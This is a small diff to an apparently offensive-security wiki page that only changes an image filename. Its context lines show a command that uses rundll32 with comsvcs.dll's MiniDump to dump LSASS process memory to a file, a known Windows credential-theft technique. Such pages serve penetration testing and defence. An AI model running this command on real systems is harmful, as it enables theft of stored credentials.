@@ -44,7 +44,7 @@ Executing a native comsvcs.dll DLL found in Windows\system32 with rundll32:
 .\rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump 624 C:\temp\lsass.dmp full
 ```
 
-![](../../.gitbook/assets/image%20%28406%29.png)
+![](../../.gitbook/assets/image%20%28405%29.png)
 
 ## References
 
